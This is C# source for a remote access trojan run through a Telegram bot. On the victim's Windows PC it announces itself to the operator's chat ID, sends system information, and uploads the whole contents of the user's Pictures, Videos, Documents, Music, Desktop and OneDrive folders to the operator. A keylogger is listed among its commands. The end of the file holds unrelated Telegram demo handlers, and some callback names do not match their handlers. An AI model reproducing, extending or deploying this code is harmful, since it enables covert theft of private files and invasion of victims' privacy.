using RAT_BotTelegram.Lib;
using System;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Requests;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace RAT_BotTelegram {
    class Program {
        private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TToken);



        // Debes escribir el ID, para que el bot solo te responda a tí.
        static void Main(string[] args) {

            // Copiar
            // Esconder

            //Método que se ejecuta cuando se recibe un mensaje
            Bot.OnMessage += BotOnMessageReceived;

            //Método que se ejecuta cuando se recibe un callbackQuery
            Bot.OnCallbackQuery += BotOnCallbackQueryReceived;

            //Método que se ejecuta cuando se recibe un error
            Bot.OnReceiveError += BotOnReceiveError;

            //Bot.SendDocumentAsync(config.id, File.Open(path, FileMode.Open));
            //Bot.SendPhotoAsync(config.id, File.Open(path, FileMode.Open));
            //Bot.SendVideoAsync(config.id, path);
            

            // Mensaje de conexión

            Bot.SendTextMessageAsync(config.id, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");

            //Bot.SendVideoAsync(config.id, File.Open(@"F:\New folder (2)\40.3gp",FileMode.Open),999,999,999,"info",ParseMode.Default,false,false);

            // Escucha servidor
            Bot.StartReceiving();
            Console.ReadLine();
            Console.WriteLine("La maquina se lenvantó ");
            Bot.StopReceiving();
        }

        private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
            var message = messageEventArgs.Message;

            if (message == null || message.Type != MessageType.Text) return;

            switch (message.Text.Split(' ').First()) {

                case "/Status": // Verifica Si la PC se encuentra en linea
                    await Bot.SendTextMessageAsync(config.id, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                    break;
                case "/Get_Information":
                    await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                    break;
                case "/Get_Files":  // Menú Obtiene archivos
                    var GetFiles = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text: "|USER| Get Pictures",
                            callbackData: "GetPictures"),
                        InlineKeyboardButton.WithCallbackData(
                            text: "|USER| Get Videos",
                            callbackData: "GetVideos"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"|USER| Get Documents",
                            callbackData: "GetDocument"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"|USER| Get Music",
                            callbackData: "GetMusic"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"|USER| Get Download",
                            callbackData: "getDownload"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"|USER| Get Desktop",
                            callbackData: "getDesktop")
                    }});
                    var GetFilesOneDrive = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text: "|OneDrive| Get Pictures",
                            callbackData: "GetPicturesO"),
                        InlineKeyboardButton.WithCallbackData(
                            text: "|OneDrive| Get Videos",
                            callbackData: "GetVideosO"),

                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"|OneDrive| Get Documents",
                            callbackData: "GetDocumentO"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"|OneDrive| Get Music",
                            callbackData: "GetMusicO"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"|OneDrive| Get Desktop",
                            callbackData: "getDesktopO"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Get all files from OneDrive",
                            callbackData: "getAllO")
                    }});
                    var GetFilesOneDriveE = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text: "|OneDrive| Get Imagenes",
                            callbackData: "GetPicturesOE"),
                        InlineKeyboardButton.WithCallbackData(
                            text: "|OneDrive| Get Videos",
                            callbackData: "GetVideosOE"),

                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"|OneDrive| Get Documentos",
                            callbackData: "GetDocumentOE"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"|OneDrive| Get Música",
                            callbackData: "GetMusicOE"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"|OneDrive| Get Escritorio",
                            callbackData: "getDesktopOE"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"|OneDrive| Todos los archivos",
                            callbackData: "getAllO")
                    }});

                    await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
                    await Bot.SendTextMessageAsync(config.id, "User Files: "+ Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
                    await Bot.SendTextMessageAsync(config.id, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                    await Bot.SendTextMessageAsync(config.id, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
                    // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");

                    break;
                //Mensaje por default
                default:
                    const string usage =
                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
                  " * Use the following commands: *\n" +
                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
                  "\n/Status                 <Check if the PC is online>" +
                  "\n/Get_Information <get detailed system information>" +
                  "\n/Get_Files          |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                  "\n/Get_DirFiles    |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
                  "\n/Keylogger       |Menu| <keylogger Options >" +
                  "\n" +
                  "\n" +
                  "\n/Help <This>" +
                  "";
                    await Bot.SendTextMessageAsync(config.id, text: usage, replyMarkup: new ReplyKeyboardRemove());
                    break;
            }
        }

        private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
            string GetFileName(string dir) {   // Retorna solo el nombre del archivo
                                              //string path = @"D:\PNG Icons\System Win 10\camera.png";
                try {
                    /* Utiliza la variable para obtener el ultimo contendor 
                     * =Ejemplo:
                     * [Antes]    path = "C:\User\UserName\Photos\SoyUnaImagen.png" 
                     * [Despues]  path =  "SoyUnaImagen.png"                                                         */
                    int palabraClave = dir.LastIndexOf(@"\");
                    dir = dir.Substring(palabraClave + 1);
                } catch {
                    dir = "Hubo un problema"; // Hubo un problema 
                }

                return dir;  // NameFile
            }
            string GetFileType(string File) {
                /* Utiliza la variable para obtener el ultimo contendor 
                 * =Ejemplo:
                 * [Antes]    path = "SoyUnaImagen.png" 
                 * [Despues]  path =  "[Imagen]"             */

               string dir = GetFileName(File);
               //string dir2 = dir;       // Solo antibuggeo
                try {
                int palabraClave = dir.LastIndexOf(".");
                    dir = dir.Substring(palabraClave + 1);
                } catch {
                    return  "[-]";
                }

                // Convierte la extensión en minuscula.
                dir = dir.ToLower();
                String[] video  = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv","3gp" };
                String[] audio  = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
                String[] doc    = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
                String[] imagen = {"jpg", "jpeg", "png", "bmp","ico", "jpe", "jpe" };
                String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};

                // Verifica si el archivo es una imagen
                foreach (string ext in imagen) {
                    if (ext == dir) {
                        Console.WriteLine("\n" + dir +" <= es una Imagen");  // Solo debug
                        return "[Imagen]";
                    }
                    Console.WriteLine(dir + " <= No es [Imagen] ");  // Solo debug
                }
                // Verifica si el archivo es una video 
                foreach (string ext in video) {
                    if (ext == dir) {
                        Console.WriteLine("\n" + dir + " <= es un Video");  // Solo debug
                        return "[Video]";
                    }
                    Console.WriteLine(dir + " <= No es [Video] ");  // Solo debug
                }
                // Verifica si el archivo es un Adudio
                foreach (string ext in audio) {
                    if (ext == dir) {
                        Console.WriteLine("\n" + dir + " <= es un Audio");  // Solo debug
                        return "[Audio]";
                    }
                    Console.WriteLine(dir + " <= No es [Audio] ");  // Solo debug
                }
                // Verifica si el archivo es un Documento
                foreach (string ext in doc) {
                    if (ext == dir) {
                        Console.WriteLine("\n" + dir + " <= es un Documento");  // Solo debug
                        return "[Doc]";
                    }
                    Console.WriteLine(dir + " <= No es [Doc] ");  // Solo debug
                }
                // Verifica si el archivo es un Documento
                foreach (string ext in system) {
                    if (ext == dir) {
                        Console.WriteLine("\n" + dir + " <= es un System");  // Solo debug
                        return "[System]";
                    }
                    Console.WriteLine(dir + " <= No es [System] ");  // Solo debug
                }

                return "[-]"; // Extension File
            }

            async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
                await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
                string infoFile(string file) {
                    FileInfo fil = new FileInfo(file);
                    var f= fil.Length;
                   

                    return "";
                }
                bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
                    FileInfo fil = new FileInfo(file);
                    var zise = fil.Length;
                    // Convierte var en int 
                    int MB = int.Parse(zise.ToString());
                    // Ejemplo : 44.6MB = 46792411
                    // Ejemplo : 95.3KB = 497687
                    if (MB >= 49999999) {
                        return false;   // Supera los 50MB
                    } else {
                        return true;    // No supera los 50Mb
                    }
                }
                bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
                    FileInfo fil = new FileInfo(file);
                    var zise = fil.Length;
                    // Convierte var en int 
                    int MB = int.Parse(zise.ToString());
                    // Ejemplo : 44.6MB = 46792411
                    // Ejemplo : 95.3KB = 497687
                    if (MB >= 9999999) {
                        return false;   // Supera los 50MB
                    } else {
                        return true;    // No supera los 10Mb
                    }
                }
                foreach (var file in Tools.GetFile(Path)) {

                    if (infoFileZize(file)) {

                        switch (GetFileType(file)) {
                            case "[Imagen]":
                                if (infoFileZizePhoto(file)) {
                                    try {
                                        await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                    } catch {
                                        // Enviar como documento.
                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                    }
                                } else {
                                    try {
                                        await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                    } catch {
                                        // Enviar como documento.
                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                    }
                                }
                                break;
                            case "[Video]":
                                try {
                                    await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
                                } catch {
                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el video, " + GetFileName(file));

                                }
                                break;
                            case "[Audio]":
                                try {
                                    await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el audio, " + GetFileName(file));
                                }
                                break;
                            case "[Doc]":
                                try {
                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                }
                                break;
                            case "[System]": // El archivo se omitidos
                                try {
                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                }
                                break;
                            default:
                                await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
                                break;
                        }
                    } else {
                        await Bot.SendTextMessageAsync(config.id, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                    }

                    await Bot.SendTextMessageAsync(config.id, file);
                }
                await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
            }

            var callbackQuery = callbackQueryEventArgs.CallbackQuery;
            string user = Features.getUserName();
            switch (callbackQuery.Data) {
                
                case "GetPictures": GetFilesTelegram(@"C:\Users\" + user + @"\Pictures");break;                          
                case "GetVideos":   GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); break;                         
                case "GetDocument": GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;
                case "GetMusic":    GetFilesTelegram(@"C:\Users\" + user + @"\Music");break;                    
                case "GetDownload": GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;                 
                case "GetDesktop":  GetFilesTelegram(@"C:\Users\" + user + @"\Desktop");break;

                // OneDrive Español
                case "GetPicturesOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Imágenes"); break;                          
                case "GetVideosOE":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                          
                case "GetDocumentOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documentos"); break;                          
                case "GetMusicOE":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Musica");break;                          
                case "GetDesktopOE":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
                case "GetgetAllO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive"); break;

                // OneDrive English
                case "GetPicturesO": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); break;                          
                case "GetVideosO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                         
                case "GetDocumentO": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); break;                         
                case "GetMusicO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); break;                         
                case "GetDesktopO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
                // Other







                case "GetDocumenttgert":
                    await Bot.SendLocationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f
                        );
                    break;
                case "GetDocumensdfdst":
                    await Bot.SendDocumentAsync(chatId: callbackQuery.Message.Chat.Id,document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");

                    ReplyKeyboardMarkup tipoContacto = new[]
                    {
                        new[] { "Opción 1", "Opción 2" },
                        new[] { "Opción 3", "Opción 4" },
                    };

                    await Bot.SendTextMessageAsync(chatId: callbackQuery.Message.Chat.Id, text: "Keyboard personalizado", replyMarkup: tipoContacto);
                    break;

                case "venue":
                    await Bot.SendVenueAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f,
                        title: "Cenfotec",
                        address: "San José, Montes de Oca"
                        );
                    break;

                case "imagen":
                    await Bot.SendPhotoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        photo: "https://www.google.co.cr/imgres?imgurl=https%3A%2F%2Fwww.pcactual.com%2Fmedio%2F2017%2F07%2F05%2Ftelegram_960x540_0aa1aeac.jpg&imgrefurl=https%3A%2F%2Fwww.pcactual.com%2Fnoticias%2Factualidad%2Fsoy-fan-telegram_13549&docid=UZhcuJ9275t8zM&tbnid=otB1G_5L3DD0sM%3A&vet=10ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ..i&w=960&h=540&bih=722&biw=1536&q=telegram%20image&ved=0ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ&iact=mrc&uact=8"
                        );
                    break;

                case "animation":
                    await Bot.SendAnimationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        animation: "https://techcrunch.com/wp-content/uploads/2015/08/safe_image.gif?w=730&crop=1"
                        );
                    break;

                case "video":
                    await Bot.SendVideoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        video: "https://res.cloudinary.com/dherrerap/video/upload/v1560039252/WhatsApp_Video_2019-06-08_at_6.10.54_PM.mp4"
                        );
                    break;

                case "document":
                    await Bot.SendDocumentAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
                        );
                    break;

                case "formato":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<b>bold</b>, <strong>bold</strong>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<i>italic</i>, <em>italic</em>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<a href='http://www.example.com/'>inline URL</a>",
                        parseMode: ParseMode.Html
                        );
                    break;

                case "reply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "ID: " + callbackQuery.Message.MessageId + " - " + callbackQuery.Message.Text,
                        replyToMessageId: callbackQuery.Message.MessageId);
                    break;

                case "contacto":
                    await Bot.SendContactAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        phoneNumber: "2222-2222",
                        firstName: "Jane",
                        lastName: "Doe"
                        );
                    break;

                case "forceReply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "Forzar respuesta a este mensaje",
                        replyMarkup: new ForceReplyMarkup());
                    break;

                case "reenviar":
                    await Bot.ForwardMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        fromChatId: callbackQuery.Message.Chat.Id,
                        messageId: callbackQuery.Message.MessageId
                        );
                    break;
            }
        }
        private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs) {
            Console.WriteLine("Received error: {0} — {1}",
                receiveErrorEventArgs.ApiRequestException.ErrorCode,
                receiveErrorEventArgs.ApiRequestException.Message);
        }
       
    }
}
